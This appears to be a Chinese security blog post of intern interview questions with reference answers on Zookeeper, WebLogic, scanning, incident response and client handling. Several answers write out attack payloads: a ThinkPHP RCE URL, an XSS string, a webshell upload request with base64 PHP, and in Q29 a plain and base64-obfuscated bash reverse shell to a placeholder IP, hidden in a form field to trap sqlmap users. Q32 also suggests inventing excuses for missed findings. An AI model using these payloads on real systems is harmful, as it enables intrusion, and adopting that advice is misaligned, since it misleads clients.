原创：3s_NwGeek合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

最近我们公司准备有几个实习生要转正了，领导让我亲自出一些结合实际安全工作的题目，题目的由来都是从工作中遇到过的问题到解决的的过程中产生的。从简单到难的题目，既能考到实习生的知识基础，又能考到他们的学习能力（面对不同未接触过的难题如何去应对），还有就是情景开放式答题，网上能查到一点资料，但是又需要自己思考的，结合实际工作来回答的。好的话不多说，由简至难奉上题目，以及参考答案，希望我的工作经验中发现的问题能帮到大家。1.
Zookeeper默认的端口

三个端口：

  1. 2181：对cline端提供服务  

  2. 3888：选举leader使用  

  3. 2888：集群内机器通讯使用（Leader监听此端口）  

官方文档:

<http://zookeeper.apache.org/doc/r3.5.5/zookeeperStarted.html>

参考资料1:

<https://blog.csdn.net/webnum/article/details/76653665>

参考资料2:

<https://www.jianshu.com/p/5e012efb2d82>

## 2\. Zookeeper主要的作用：  

开源的、分布式的、应用程序协调服务

推荐：参考资料1（ZooKeeper是什么）——

<https://blog.csdn.net/u012152619/article/details/52901319>

参考资料2（ZooKeeper详解） ——

<https://www.imooc.com/article/251135>

参考资料3（漫画图解ZooKeeper）——

<https://juejin.im/post/5b037d5c518825426e024473>

## 3\. Zookeeper 未授权访问的检查方法  

telnet zookeeper端口 输入envi，回显路径等信息则存在zookeeper未授权访问漏洞

## 4\. 请列出让客户满意的Zookeeper未授权访问漏洞的修复方案  

根据客户实际情况可以提供以下修复方案：

  1. 禁止将zookeeper暴露在公网  

  2. 使用iptables对端口进行访问控制  

  3. 添加访问控制，根据情况选择对应方式（认证用户，用户名密码）  

  4. 绑定指定IP访问  

参考链接1：<https://thief.one/2017/12/08/1>

参考链接2：

<https://p4yche.com/2018/08/10/zookeepr%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/zookper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/>

## 5\. Weblogic后台默认密码  

weblogic/weblogic

## 6\. weblogic CVE-2019-2725漏洞描述与让客户满意的修复方案  

漏洞描述 ：由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。

修复建议 ： 官方目前已发布针对此漏洞的紧急修复补丁，可以采取以下4种方式进行防护。

  1. 及时打上官方CVE-2019-2725补丁包官方已于4月26日公布紧急补丁包，下载地址：<https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html?from=timeline>  

  2. 升级本地JDK版本因为Weblogic所采用的是其安装文件中默认1.6版本的JDK文件，属于存在反序列化漏洞的JDK版本，因此升级到JDK7u21以上版本可以避免由于Java原生类反序列化漏洞造成的远程代码执行。  

  3. 配置URL访问控制策略部署于公网的WebLogic服务器，可通过ACL禁止对/_async/及/wls-wsat/路径的访问。  

  4. 删除不安全文件删除wls9_async_response.war与wls-wsat.war文件及相关文件夹，并重启Weblogic服务。具体文件路径如下：10.3.*版本:  

\Middleware\wlserver_10.3\server\lib\%DOMAIN_HOME%\servers\AdminServer\tmp\\_WL_internal\
%DOMAIN_HOME%\servers\AdminServer\tmp\\.internal\

12.1.3版本：

\Middleware\Oracle_Home\oracle_common\modules\%DOMAIN_HOME%\servers\AdminServer\tmp\\.internal\%DOMAIN_HOME%\servers\AdminServer\tmp\\_WL_internal\

注：wls9_async_response.war及wls-wsat.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。若在直接删除此包的情况下应用出现问题，将无法得到Oracle产品部门的技术支持。请用户自行进行影响评估，并对此文件进行备份后，再执行此操作。

参考网站1：

<https://www.chainnews.com/articles/956692560698.htm>

参考网站2：

<https://www.anquanke.com/post/id/177381#h2-3>

## 6.2  

假设现weblogic爆发0day漏洞，weblogic的/vulpath存在漏洞，所有存在[http://ip:port/vulpath](http://ip/vulpath)
路径的系统均受影响，现已完成目标资产的端口扫描，需要你紧急排查受影响资产，请说说你的做法

假设端口扫描时已有版本识别，挑出所有weblogic服务
挑出weblogic服务存在IP+端口地址后，通过url批量检测脚本httpCatcher.py检测出是否存在ip:port/vulpath路径200返回值，返回即为受影响资产

用法为：将IP+端口存在一个ip.txt文件。

![v2-bbb05863a54dddb1966f457c0ad669e0_hd.w](https://pic2.zhimg.com/80/v2-bbb05863a54dddb1966f457c0ad669e0_hd.webp)

然后修改httpCatcher.py的路劲改为/vulpath

![v2-c04f41b6a2f0b7a15a58d92531c20bab_hd.w](https://pic3.zhimg.com/80/v2-c04f41b6a2f0b7a15a58d92531c20bab_hd.webp)

![v2-6050ec3a8db0152f451b180dbff53d33_hd.w](https://pic1.zhimg.com/80/v2-6050ec3a8db0152f451b180dbff53d33_hd.webp)

输入命令python httpCatcher.py ip.txt 1.csv即可得到1.csv文件，查看即可

![v2-c04f41b6a2f0b7a15a58d92531c20bab_hd.w](https://pic2.zhimg.com/80/v2-c04f41b6a2f0b7a15a58d92531c20bab_hd.webp)

![v2-447454a2d50c7155f9724bedbe28350e_hd.w](https://pic1.zhimg.com/80/v2-447454a2d50c7155f9724bedbe28350e_hd.webp)

![v2-573cc9a05d12a51a8592301a72e1840d_hd.w](https://pic4.zhimg.com/80/v2-573cc9a05d12a51a8592301a72e1840d_hd.webp)

## 7.以下exp是属于哪个cms的远程代码执行漏洞：  

##
<http://localhost:9096/public/index.php?s=index/think>\app/invokefunction&function=call_user_func_array&vars[0]=system&vars1=whoami  

路径有关键字 think ， 和 PHP ,再使用payload进行查询可知为 thinkphp 中间件
thinkPHP是国产开源的PHP开发框架，中国使用最多

参考资料：

<https://www.jianshu.com/p/5c7ba693b265>

## 8.流量分析：webshell流量交互的流量特征有哪些（列举3个特征来简略描述）  

webshell是用来控制服务器的，在控制服务器的过程中，就会触发许多 系统函数
,例如eval、z0（菜刀特征）、shell，需监控这些关键的函数，具体需要查看是哪个网页发起的请求进行鉴别

除此之外，webshell连接可能使用
base64编码，正常功能也会使用base64容易引起误报，一般与eval数量对比，数量差异较小时可能被上传webshell进行编码通讯

除了系统函数、base64编码通讯外，还存在int_set("display_errors","0"), 为webshell流量特征之一

还可以监控ifconfig whoami ipconfig等关键命令，这是获得webshell后基本上都会执行的命令

## 9.批量检查http服务使用什么工具和简略使用步骤  

方法1

直接使用nmapsV.py工具即可，用法为python3 nmapsV.py ip.txt result.txt

方法2

使用nmap工具扫描，带上-sV参数进行版本识别即可，将待检测的IP地址/地址段添加进ip.txt文件中

使用命令nmap -sV -iL ip.txt -oA OUTPUT --no-stylesheet

扫出来的结果导出 nmap文件，使用nampReport工具得出结果

##
10.假设客户给到你有50万个ip，并要求你两周内做完全端口扫描，你会如何应对或如何实施（从两方面回答：1.如何对客户要求做出解释并合理调整。2.如何提高全端口扫描效率，既保证速度，又保证准确率）  

首先客户提出提出两周50w个ip全端口这个肯定不现实，所以要考虑跟客户解释，有必要对扫描任务进行时间调整，安排尽可能多的扫描资源，如扫描机器，扫描网络带宽等
，参考扫描100个IP端口的平均时长，估计扫完的时间，给出30天时间左右答复，并且留出一周进行后续补扫，文档整理等

使用到 多线程 分布式 和 高并发 ,采用masscan + nmap
先masscan存活过一遍，把未存活IP剔除掉；使用分布式nmap高并发过一遍端口，也可以massacn端口扫描过一遍，在nmap进行探测

提高扫描速度 由于IP数量过多，不能直接把所有的IP都丢上去扫，时间肯定不够 可以跟客户商量减少IP数量，对未存活的IP进行筛选过滤
加快扫描速度需要进行参数微调，如--min-hostgroup、--min-rate和--min-parallelism
对于存在防火墙的情况，可以提出需要提供扫描器，最好的墙内扫

数据整理 对于大量的list和json使用python-nmap python-masscan，扫描1个IP处理1个IP

不推荐做法

老油条混子做法：行，没问题，别说五十万个了五百万个都能完成，接活的时候明确的说时间紧，任务重，可能会存在误报，问客户接不接受，接受了就开始扫。
masscan先过一遍，过滤掉一批死ip和只有80，443，8080，8443，等web的 然后高并发，分布式nmap过一批常用端口，把有结果的过滤出来
然后把没结果再跑一遍全端口，交差 后面扯皮的时候也能扯，前期也明确说了存在误报

## 11\. 存活性探测的简要步骤  

使用nmap工具进行存活性探测 使用nmap，命令nmap -sP -n -iL ip.txt -oA OUTPUT --no-stylesheet

在Linux中使用cat OUTPUT.gnmap |grep Up |awk ‘{print $2}’ > ip_cunhuo.txt 即可得到存活IP

## 12\. 条件竞争漏洞原理与举例  

条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

举个例子，很多web程序都会有上传文件的功能，头像和图像等，服务器肯定会检查文件是否满足条件，不满足的要被删除
那么问题就在于，如果我们采用大量的并发请求，就传递一个生成恶意webshell的图像，访问它就可以生成webshell。在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell文件，后续的一切就都不是问题了。

参考链接1：

<https://blog.csdn.net/iamsongyu/article/details/83346260>

参考链接2：

<https://seaii-blog.com/index.php/2017/04/26/49.html>

参考链接3：

<https://www.cnblogs.com/0xJDchen/p/5988275.html>

## 13.假设客户中了GhostPetya勒索病毒向你咨询解决方案，请描述需要告诉他应该做些什么，如何去应急处置和善后补救  

13.1 未部署端点安全的终端应急解决方案

1.做好重要文件的备份工作（非本地备份）。

2.开启系统防火墙。

3.利用系统防火墙高级设置阻止向445端口进行连接（该操作会影响使用445端口的服务）。

4.打开系统自动更新，并检测更新进行安装。

5.停止使用Windows XP、Windows 2003等微软已不再提供安全更新的操作系统。

6.如无需使用共享服务建议关闭该服务。

13.2 已部署端点安全的终端应急解决方案

1.如果用户已经部署终端管理类产品，可通过终端管理软件进行内网打补丁。

2.通过主机防火墙关闭入栈流量。主机防火墙关闭到445出栈流量。

3.开启文件审计，只允许word.exe，explorer.exe等对文件访问。

13.3 已经感染应急解决方案

1.断开网络连接，阻止进一步扩散。优先检查未感染主机的漏洞状况（可直接联系网御星云公司，提供免费检测工具使用），做好漏洞加固工作后方可恢复网络连接。

2.已经感染终端，根据终端数据类型决定处置方式，如果重新安装系统则建议完全格式化硬盘、使用新操作系统、完善操作系统补丁、通过检查确认无相关漏洞后再恢复网络连接。

预防措施

打补丁：及时给系统打补丁，修复漏洞。

装杀软：安装杀毒软件，及时更新病毒库。开启防火墙，并升级到最新版本，阻止勒索病毒与其C&C服务器通信。

做备份：定期对重要文件以及数据库做非本地备份。电脑开启系统备份，并添加保护（这样可通过卷影备份将系统恢复到被加密之前的状态）。

备份恢复：如果事先已对关键文件做了备份，在确保已清除病毒情况下可做数据备份恢复。如果卷影备份未被勒索病毒删除，可通过卷影备份将系统恢复到未感染勒索病毒的时间点。

改密码：使用长度大于10位的复杂密码。

加限制：禁用GUEST来宾用户。尽量不要使用局域网共享，或把共享磁盘设置为只读属性，不允许局域网用户改写文件。尽量关闭不必要的端口，如：445、135、139、
3389、5900 。

防钓鱼：不要点击来源不明的邮件以及附件，钓鱼邮件是勒索病毒的重要传播源。

## 14.请描述我们公司的网络安全现状，与改进方案  

(非标准答案)

xx公司的网络安全状况主要存在以下几点安全隐患：

  1. IP段划分不清 IP段划分不清导致的后果就是资产管理混乱，不明IP过多，可能存在“三无七边”系统，导致安全隐患  

  2. 公司疑似存留被人入侵过的痕迹，需要及时排查  

  3. 公司存在开源社区源代码泄露情况  

改进方案：

  1. 资产清查启用资产清查方案，对存活IP进行认领，收集各个系统安全负责人，统一对各个IP网段进行划分部署  

  2. 进行安全检查 + 渗透资产收集完成以后，对天讯公司进行常规安全检查，包括：全端口、主机、web和服务器进行基线检查 对扫描完的结果根据资产收集情况下发给各个负责人进行整改 其外，安全中心团队安排渗透人员对公司网站进行渗透测试，发现系统脆弱性  

  3. 源代码泄露情况自查 使用安全中心团队搭建的GitHub代码泄露监控系统进行检查  

## 15\. 如何排查常见挖矿木马  

首先挖矿木马是占用系统资源进行挖矿行为

常见的遭遇挖矿会有以下行为：

  1. 系统响应缓慢  

  2. CPU/显卡使用率过高  

  3. 内存/带宽占用高  

登录进可疑主机后，可以通过以下方式确认挖矿木马：

  1. 查看进程（系统命ps、ls令有可能被替换）  

  2. 检查日志、检查系统用户  

  3. 发现异常文件  

参考链接：

[https://mp.weixin.qq.com/s/FhcoPGXG_udkRCj3AFOmxA?utm_medium=hao.caibaojian.com&utm_source=hao.caibaojian.com](https://mp.weixin.qq.com/s/FhcoPGXG_udkRCj3AFOmxA?utm_medium=hao.caibaojian.com&utm_source=hao.caibaojian.com)

参考链接2：

<https://blog.csdn.net/bittersweet0324/article/details/80650626>

## 16.如何清查互联网暴露面  

对于客户不清楚自己是否还有其他互联网暴露面的时候，需要先将客户已知的资产清单收集起来，方便后续对比

对于公网暴露面：

在出口网关设置流量监控工具（wireshark或者自带防火墙），检测足够长的时间以获得可能存在的暴露IP地址
nmap公网扫描全端口走一波，然后对照已知资产清单即可

nmap全端口扫描命令：nmap -sV -n -Pn -p- -iL ip.txt -oA OUTPUT --no-stylesheet --min-rate 5000 --max-retries 3

未认领的资产进行下线关停处理

## 17.如何检查mongodb未授权访问漏洞  

方法一：

使用mangodb_unauth.py脚本进行处理，将ip地址放进target.txt

用法为：python mangodb_unauth.py target.txt

方法二：

使用nmap插件，命令为：nmap -p 27017 --script mongodb-info 192.168.0.1/24

参考链接：

<https://lfoder.github.io/2018/04/12/Nmap%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E5%85%A8%E6%8A%80%E5%B7%A7/?tdsourcetag=s_pctim_aiomsg>

## 18.如何检测iis短文件名漏洞  

方法一：

使用iis_shortname_Scan.py脚本进行检测，

用法：

python IIS_shortname_Scan.py <http://www.target.com/>

参考链接：

[http://www.lijiejie.com/?s=IIS&submit=Search](http://www.lijiejie.com/?s=IIS&submit=Search)

方法二：

使用nmap，命令为nmap -p 80 --script http-iis-short-name-brute 192.168.0.1/24

参考链接：

<https://lfoder.github.io/2018/04/12/Nmap%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E5%85%A8%E6%8A%80%E5%B7%A7/?tdsourcetag=s_pctim_aiomsg>

## 19.如何验证存在xss漏洞  

XSS漏洞的原理是：插入语句、改变结果、操纵数据，本质是：用户输入的html语句直接输出，包括了使用不正确的方法去验证。

挖掘XSS的第一步是找输入，也就是用户可以操控代码的位置

第二步是找输出，也就是找到第一步用户输入的代码在网页的何处地方进行了输出

第三步：构造payload，
通过查看源代码，构建出payload。如代码输出位置在<td>test</td>，即可构建出payload：test</td><svg/onload=console.log(1)><td>，
最后输出结果为：

<td>test</td><svg/onload=console.log(1)><td></td>

## 20.如何验证存在任意文件下载的漏洞  

一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。

利用条件：

  * 存在读文件的函数  

  * 读取文件的路径用户可控且未校验或校验不严  

  * 输出了文件内容  

任意文件下载和任意文件读取有着相似的地方：就是都需要路径 例如 index.php?f=ﬁle:///etc/passwd
index.php?f=../index.php

修复方案：

两者的修复方案如下：

  * 过滤用户数据，如“/”，“*”,"."等特殊字符  

  * 更新中间件  

  * 要下载的文件地址保存至数据库中。  

  * 文件路径保存至数据库，让用户提交文件对应ID或session下载文件。  

  * 用户下载文件之前需要进行权限判断。  

  * 文件放在web无法直接访问的目录下。  

  * 不允许提供目录遍历服务。  

  * 公开文件可放置在web应用程序下载目录中通过链接进行下载  

参考链接：

<https://www.cnblogs.com/zhaijiahui/p/8459661.html>

## 21.如何判别web服务器是windows还是linux  

方法有许多，

  * 方法一：nmap带上-O参数  

  * 方法二：查看http报头Server字段  

  * 方法三：Windows对于大小写不敏感，替换某个字母为大写返回正常为Windows，反之Linux  

  * 方法四：TTL返回值，TTL为64，有很大可能性为Linux，TTL为128，有很大可能性为Windows，TTL为255，有很大可能性为UNIX（可修改TTL）  

参考链接：

<https://www.zhihu.com/question/20375910>

## 22.ddos攻击如何去防范  

DDoS分为很多种，对于不同的类型有着不同的应付方式

目前对于低网络层的DDoS攻击有一些有效的防护手段，如丢弃第一次SYN包，上流量防护设备，上WAF封禁地址等

比较难缠的是第七层，第八层的CC攻击，它会找到目标网站上比较消耗资源的关键位置，重复发起攻击以消耗CPU/内存/数据库IO等资源
目前的应付手段有：优化资源消耗高位置的代码，增加硬件设备，上云，购买专业安全公司的安全服务

除此之外，隐藏服务器的真实IP、上云WAF、CDN、负载均衡等设备，或者暂时将域名解析到公安网警网站等 也是可以作为选择方案

## 23\. web短信重置密码有可能有哪几种绕过方式  

1，短信验证码可爆破；

2，短信验证码显示在获取验证码请求的回显中；

3，注册手机号及短信验证码未进行匹配性验证；

4，用户名、手机号码、短信验证码三者没有进行匹配性验证；

5，短信验证码的验证在本地客户端进行验证；

6，重置步骤未进行校验；

7，重置请求未验证身份；

8，登陆成功修改密码功能平行越权；

9，未校验身份信息的唯一标识cookie信息；

参考链接1：

<https://www.cnblogs.com/peterpan0707007/p/8721094.html>

参考链接2：

<http://www.nxadmin.com/web/1642.html>

## 24.假设发现数据库短时间内查询异常次数增多，描述sql查询异常流量分析的思路。  

数据库短时间内查询增多有可能遭遇到了扫描或者sql注入测试，可以结合流量分析工具进行研判

select 和 union
为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在SQL注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需要进一步查看具体请求参数

如：

1) 使用wireshark打开抓取后的流量包。

2) 对于抓取到的数据包筛选出HTTP协议包，在统计处筛选出短时间内流量较大的IP

![v2-ef781904e7763c792981d95bcf36948d_hd.w](https://pic1.zhimg.com/80/v2-ef781904e7763c792981d95bcf36948d_hd.webp)

3) 尝试定位一些基本的注入特征（select、union、()、/*、sleep等）

![v2-c04f41b6a2f0b7a15a58d92531c20bab_hd.w](https://pic3.zhimg.com/80/v2-c04f41b6a2f0b7a15a58d92531c20bab_hd.webp)

![v2-36cded90fa7cd3c7c5e22a03009cc26b_hd.w](https://pic2.zhimg.com/80/v2-36cded90fa7cd3c7c5e22a03009cc26b_hd.webp)

4) 筛选出可以攻击IP，分析流量包HTTP流。即可定位

![v2-aa5346a274989cb72c6c66b95152ea66_hd.w](https://pic2.zhimg.com/80/v2-aa5346a274989cb72c6c66b95152ea66_hd.webp)

## 25.假设发现web应用服务器发现文件异常增多，初步怀疑被上传webshell，描述流量分析溯源的思路。  

可利用流量工具进行溯源：

1） 查看eval、z0、shell、whoami等关键字，查看出现次数过多的时候，可能需要查看是哪个页面发起的请求，有可能是webshell

2） 通过WireShark工具快速搜索关键字，定位到异常流量包

3） 找出异常IP和所上传的内容，查看是否为webshell

如何定位到攻击IP:

1) 首先通过选择-统计-对话查看流量的走向情况，定位可疑的IP地址

2) 根据定位到的IP地址，尝试对上传的webshell进行定位ip.addr == ip && http matches
“upload||eval|select|xp_cmdshell”&& http.request.method == “POST”

3) 查找到Webshell后尝试溯源漏洞位置，http.request.uri contains
“webshell.php”，定位到最开始webshell执行或上传的时候

4) 根据最开始的HTTP上传包或者其他漏洞特产定位漏洞类型

## 26.假设渗透时发现服务器开了21，80，445，3306，11211端口，你有什么渗透思路。  

1) 针对21端口 21端口开放表明运行这FTP服务，可以尝试对FTP进行爆破和尝试匿名anonymous/空登陆。以及使用MS12-073的攻击尝试。

2)
80端口对应web服务，可通过信息收集，分析出去中间件类型和版本，后端语言类型。还有CMS类型，看是否可有已知漏洞可利用。若无，对Web站点进行渗透测，查看是否存在注入等漏洞。

3) 445端口对应网络共享SMB服务，可尝试利用ms08-067，ms17-010等溢出漏洞对服务器进行攻击。也可以尝试使用IPC$进行攻击

4) 对于3306
mysql端口也可以采用爆破的方式。成功后，可以用mysql写webshell，或者构造VBS写入服务器启动项，带服务器重启就可以添加管理员账号和打开3389端口。

5) 11211端口是memcached服务的端口。memcache默认情况下存在未授权访问漏洞，telnet ip
就可以获得服务器敏感信息。对进一步渗透提供帮助

参考链接1：

<http://www.anquan.us/static/drops/papers-865.html>

参考链接2：

<https://help.aliyun.com/knowledge_detail/37553.html>

## 27.假设渗透时发现服务器开了22，8080，8161，6379端口，你有什么渗透思路。  

1) 22端口一般时LINUX服务器的SSH远程登陆协议，一般也采用爆破的方法。

2) 8088Hadoop Yarn资源管理系统REST API存在未授权漏洞。通过curl -v -X
POST申请新的application，构造提交任务后即可在相应目录生成webshell。

3) 8161运行着Apache
ActiveMQ。其Console存在默认端口和默认密码/未授权访问(默认密码为admin:admin)。当ActiveMQ开启PUT请求时(默认开启)，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息。ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。ActiveMQ除了支持PUT协议之外，还支持MOVE协议，可导致任意文件移动漏洞。其还存在CVE-2015-5254
反序列化等漏洞。

4) 6379是redis数据库的开放端口。Redis因配置不当可以导致未授权访问。通过连接redis（./redis-cli -h
IP），可实现写入webshell，写入crontab计划任务反弹shell，以及写入ssh公钥，获取操作系统权限。其端口也可被暴力破解。

## 28.假设你有服务器的php一句话 webshell，代码为 <?php eval($_POST[“cmd”]) ?>
，现在使用webshell直接构造请求包上传文件，请给出使用webshell直接上传文件的请求包。  

``

`POST /1.php HTTP/1.1User-Agent: Java/1.8.0_211Host: 127.0.0.1Accept:
text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-aliveContent-type: application/x-www-form-urlencodedContent-Length:
800cmd=@eval.(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=QzpcVXNlcnNcRWxsaW90XERlc2t0b3BccGhwc3R1ZHlccGhwc3R1ZHlfaW5zdGFsbGF0aW9uXFBI%0D%0AUFR1dG9yaWFsXFdXV1w%3DH`

## 29\. 反渗透思路

##  

假设新手攻击者想对[http://3s_nwgeek.com/test.php](/test.php)

使用kali linux 中的Sqlmap做注入测试，该test.php正常请求包如下：POST /test.php HTTP/1.1 Host:
3s_nwgeek.com:80 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64;
rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json,
text/javascript, /; q=0.01 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Content-Length: 478 Connection: close

test=123 已知新手攻击者会直接复制post的data使用sqlmap 命令：

sqlmap -u [http://3s_nwgeek.com/test.php](/test.php)

\--data “post的data” --dbs --random-agent来进行sql注入漏洞检测，现在你是网站的开发，你会如何进行反渗透，令攻击者在输入测试指令的过程中不经意地执行了你的恶意指令。

其实sqlmap的命令中, 在Linux下的bash命令为: sqlmap -u
[http://3s_nwgeek.com/test.php](/test.php) \--data “post的data” --dbs --random-agent 其中如果在命令中插入双引号中的”!!”或者”!+数字”，会替换成历史命令，执行”history”命令,就可以知道哪些数字对应哪些命令了。
如果我将”!”放入到http请求中, 执行了bash# sqlmap -u
"[www.asnine.com/test](http://www.asnine.com/test)"
--data"post!!request=hacked" 首先双引号中的!!会被替换成你最近执行的一条历史命令 上面只是一个例子

那么如果将 ` 这个符号插进命令行中, 任何在 `` 之间的命令，都会被执行 如果我将这些特殊的字符(“!” ,
“`”…)放到get/post/cookie等http请求参数中，万一有人用sqlmap去对该网站进行安全测试，而注入参数正好包含了这些特殊字符，那么有意思的事情就产生了

构建的参数如下:

sqlmap –u "[http://sample.com/a=xxx&b=xxx](http://sample.com/a=xxx&b=xxx)"
–data "evilcode"

例如一个form表单, 代码如下:

<input type='hidden' name='name'value='Robin&id=4567&command=shell`bash -i
>&/dev/tcp/192.168.xxx.xxx/2333 0>&1`&port=1234'/>

如果访问这个页面, 就会有以下的数据包产生

![v2-c04f41b6a2f0b7a15a58d92531c20bab_hd.w](https://pic2.zhimg.com/80/v2-c04f41b6a2f0b7a15a58d92531c20bab_hd.webp)

![v2-b66c0340c5b2ab15552f6299462f13e9_hd.w](https://pic1.zhimg.com/80/v2-b66c0340c5b2ab15552f6299462f13e9_hd.webp)

这时候如果直接将postdata，复制，粘贴，sqlmap执行之, 就凉了, 就会被执行

sqlmap –u "http://sample.com/a=xxx&b=xxx" –data
name=Robin&id=4567&command=shell`bash -i >&/dev/tcp/192.168.xxx.xxx/2333
0>&1`&port=1234

bash -i >&/dev/tcp/192.168.xxx.xxx/2333 0>&1这个特征比较明显，我们可以进行进行编码一下，可以避开很多问题

bash -c
{echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjgueHh4Lnh4eC8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}

其中 ` 里面的命令就会被执行

参考链接1:

<https://www.freebuf.com/sectool/116706.html>

参考链接2:

<https://www.freebuf.com/articles/network/116922.html>

## 30\.
某专业公司A公司安全项目，跟专业公司A谈妥后完成了外网扫描任务，现在进行内网扫描。由于业务量比较大安排在晚上下班后进行扫描。第一天扫描晚上9点由于不明原因导致A专业公司所有系统无法访问，被专业公司A的人询问情况，
第二天检查原因发现，是因为所有流量是经过VPN到达主机，导致进出口VPN网关堵塞，业务无法正常访问，请问被专业公司A的人询问情况如何应急处理？判断原因并说明后续如何开展扫描任务？  

考查应急处理和客户沟通，首先调解客户情绪，跟客户沟通，立马停止扫描以恢复业务系统正常，并告知A公司进行排查原因，检查网络与主机情况。
其次考察网络知识，既然流量通过VPN会进行堵塞，想办法绕过此VPN或者降速，这里要求提供内网扫描机器进行扫描即可，但需要吸取上次经验扫描前进行扫描测试，如在中午休息的时候进行探测性扫描，测压。然后在晚上再进行扫描，扫描时需要A公司派网管人员帮忙查看系统状况是否正常。

## 31\.
扫描任务结束后将结果发给A公司，A公司对其中的一类型漏洞表示疑惑：认为自己没有办法修复此类漏洞（比较积极的专业公司），向我方询问，并想要我方帮忙修复漏洞。此场景应该怎么处理？  

考察责任划分问题，原则上是不允许直接操作客户公司的机器，以及 对于客户机器权限需要特别谨慎对待（能不要就不要）,
我们负责解释漏洞这方面的事宜，并且积极的提供整改建议，并不能直接或者间接操作客户机器。

其次考验客户想让我们直接修复漏洞的处理方式，这种情况会经常出现在我们的日常工作中，我们要说明职责范围:
我们只负责解释漏洞描述和原理以及修复建议，他们负责整改. 我们对系统业务不熟悉，我们亲自修复话出现风险和问题也是我们承担不了的。

## 32\.
安全任务结束后，发还结果给A公司，A公司经过检查后发现某个漏洞没有出现在结果里，被遗漏了。经检查后发现确实是我方当时没有扫描出来，如何跟客户解释和处理？  

考察沟通能力， 首先安抚客户情绪, 直接先给结论不合适，可以先表示我们进行核查后反馈，然后扫描的漏洞进行复扫再分析,
接下来就是找有理有据经得起推敲的理由来合适圆场

先确认该漏洞是否存在

如果漏洞存在

也就是我们没扫出来，就需要检查当时资产是否存活，是不是关停又开起来，是不是因为当时网络不好，带宽不够大，网络波动大，外网环境不稳定、WAF拦截等，先稳住客户情绪，让客户相信我们是有能力的，只是偶尔因为不可控因素出现了问题
然后提供补救方案，进行补扫等后续方案

如果漏洞扫不出来 换个扫描器，比较差异，如果还是扫不出来的话，就要考虑优化方案，看要不要立个专项检测来单独对此漏洞进行批量排查。
如果实在是我们的问题，找不到理由圆场的话，我们就老实承认, 找客户经理进行沟通，提出不足并且要有改进的方案等,
考虑如何给客户一个满意的交代，确保下次不会再出现此类问题

  

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需转载，请注明出处！

